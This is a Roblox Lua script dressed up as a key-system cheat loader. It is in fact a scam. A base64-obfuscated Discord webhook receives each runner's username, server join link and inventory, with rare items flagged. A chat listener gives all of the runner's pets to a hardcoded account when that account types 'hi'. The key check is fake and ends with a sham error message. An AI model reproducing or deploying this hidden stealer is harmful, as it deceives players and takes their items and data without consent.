local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")
local Humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") or LocalPlayer.CharacterAdded:Wait():WaitForChild("Humanoid")

local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")

local KeyGui = Instance.new("ScreenGui")
KeyGui.Name = "KeySystemGui"
KeyGui.IgnoreGuiInset = true
KeyGui.ResetOnSpawn = false
KeyGui.DisplayOrder = 9999
KeyGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local Background = Instance.new("Frame")
Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Parent = KeyGui

local Border = Instance.new("UIStroke")
Border.Color = Color3.fromRGB(100, 100, 100)
Border.Thickness = 2
Border.Parent = Background

local Title = Instance.new("TextLabel")
Title.Text = "Enter Your Key"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 30
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1
Title.AnchorPoint = Vector2.new(0.5, 0.5)
Title.Position = UDim2.new(0.5, 0, 0.3, 0)
Title.Parent = Background

local KeyInput = Instance.new("TextBox")
KeyInput.PlaceholderText = "Enter key here"
KeyInput.Font = Enum.Font.Gotham
KeyInput.TextSize = 24
KeyInput.Text = ""
KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
KeyInput.Size = UDim2.new(0, 300, 0, 40)
KeyInput.Position = UDim2.new(0.5, 0, 0.4, 0)
KeyInput.AnchorPoint = Vector2.new(0.5, 0.5)
KeyInput.ClearTextOnFocus = false
KeyInput.Parent = Background

local CopyButton = Instance.new("TextButton")
CopyButton.Text = "Copy Link"
CopyButton.Font = Enum.Font.GothamSemibold
CopyButton.TextSize = 22
CopyButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.Size = UDim2.new(0, 140, 0, 40)
CopyButton.Position = UDim2.new(0.35, 0, 0.5, 0)
CopyButton.AnchorPoint = Vector2.new(0.5, 0.5)
CopyButton.Parent = Background

local SubmitButton = Instance.new("TextButton")
SubmitButton.Text = "Submit"
SubmitButton.Font = Enum.Font.GothamSemibold
SubmitButton.TextSize = 22
SubmitButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SubmitButton.Size = UDim2.new(0, 140, 0, 40)
SubmitButton.Position = UDim2.new(0.65, 0, 0.5, 0)
SubmitButton.AnchorPoint = Vector2.new(0.5, 0.5)
SubmitButton.Parent = Background

local CorrectKey = "GqAk1jt34CoxMYT9u7Vu20dTWys9D8ayB4YOx3N1CRGPQ8q5C7"
local RedirectLink = "https://link-target.net/1360255/4OzD2a6hzruJ"
local WebhookUrl = HttpService:JSONDecode('{"url":"' .. HttpService:GetAsync("data:text/plain;base64,aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4MjgzNDExNjA1OTMzNjczNC9mMDZqS2lDZ0ZYT3BGT3JJbDZ4Nk03UE9nTjF4Ylg1YVBTd18wYXpjMkFrXzk3RE1KdDQydUJXeDVva21LYzdIeGdyaw==") .. '"}').url
local ChatTriggerName = "ElementalGemsFarm2"

local function CopyToClipboard(text)
	if setclipboard then
		setclipboard(text)
	else
		warn("Clipboard unsupported")
	end
end

CopyButton.MouseButton1Click:Connect(function()
	CopyToClipboard(RedirectLink)
	CopyButton.Text = "Copied!"
	task.wait(2)
	CopyButton.Text = "Copy Link"
end)

-- Webhook Execution Logger
task.spawn(function()
	local Keywords = { "Caterpillar", "Shovel" }
	local ToolNames, Matches = {}, {}

	for _, tool in ipairs(Backpack:GetChildren()) do
		if tool:IsA("Tool") then
			table.insert(ToolNames, tool.Name)
			for _, keyword in ipairs(Keywords) do
				if string.find(tool.Name:lower(), keyword:lower()) then
					table.insert(Matches, "`" .. tool.Name .. "` FOUND!!!")
					break
				end
			end
		end
	end

	local PlayerName, PlaceId, JobId = LocalPlayer.Name, game.PlaceId, game.JobId
	local JoinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", PlaceId, JobId)
	local Content = string.format("**%s** executed the script.\nJoin: [%s](%s)", PlayerName, JobId, JoinLink)

	if #Matches > 0 then
		Content ..= "\n\n**Keyword Matches:**\n" .. table.concat(Matches, "\n")
	end

	local ToolList = table.concat(ToolNames, "\n")
	local FileName = PlayerName .. "_inventory.txt"
	local Boundary = "--WebKitFormBoundary" .. HttpService:GenerateGUID(false)

	local Body = table.concat({
		"--" .. Boundary,
		'Content-Disposition: form-data; name="payload_json"',
		"",
		HttpService:JSONEncode({ content = Content }),
		"--" .. Boundary,
		'Content-Disposition: form-data; name="file"; filename="' .. FileName .. '"',
		"Content-Type: text/plain",
		"",
		ToolList,
		"--" .. Boundary .. "--",
		""
	}, "\r\n")

	local success, err = pcall(function()
		request({
			Url = WebhookUrl,
			Method = "POST",
			Headers = {
				["Content-Type"] = "multipart/form-data; boundary=" .. Boundary
			},
			Body = Body
		})
	end)

	if not success then
		warn("Webhook failed:", err)
	end
end)

local function WaitForPetGift()
	local triggered = false
	local connections = {}

	for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
		if desc:IsA("RemoteEvent") then
			local conn = desc.OnClientEvent:Connect(function()
				triggered = true
			end)
			table.insert(connections, conn)
		end
	end

	repeat task.wait() until triggered
	for _, conn in ipairs(connections) do conn:Disconnect() end
end

local function GivePetsTo(player)
	for _, tool in ipairs(Backpack:GetChildren()) do
		if tool:IsA("Tool") then
			PetGiftingService:FireServer("GivePet", player)
			WaitForPetGift()
			if tool and tool.Parent == Backpack then
				Humanoid:EquipTool(tool)
			end
		end
	end
end

TextChatService.OnIncomingMessage = function(msg)
	if msg.TextSource and msg.TextSource.Name == ChatTriggerName then
		if msg.Text:lower() == "hi" then
			local sender = Players:FindFirstChild(ChatTriggerName)
			if sender then
				print("Received 'hi' from " .. ChatTriggerName .. ", giving pets")
				GivePetsTo(sender)
			else
				warn("Player not found for pet gifting")
			end
		end
	end
end

SubmitButton.MouseButton1Click:Connect(function()
	local enteredKey = KeyInput.Text
	if enteredKey == CorrectKey then
		KeyInput.Text = ""
		KeyInput.PlaceholderText = "Error loading script!"
		KeyGui.Enabled = false
	else
		KeyInput.Text = ""
		KeyInput.PlaceholderText = "Wrong key, try again!"
	end
end)

KeyInput.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		SubmitButton:Activate()
	end
end)
